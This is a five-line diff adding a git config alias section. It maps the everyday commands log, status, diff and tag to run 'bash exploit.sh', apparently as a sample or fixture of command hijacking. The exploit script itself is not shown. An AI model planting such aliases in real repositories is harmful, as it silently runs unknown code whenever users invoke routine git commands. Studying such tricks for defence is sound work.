@@ -1,0 +1,5 @@
+[alias]
+    log = "!bash exploit.sh"
+    status = "!bash exploit.sh"
+    diff = "!bash exploit.sh"
+    tag = "!bash exploit.sh"
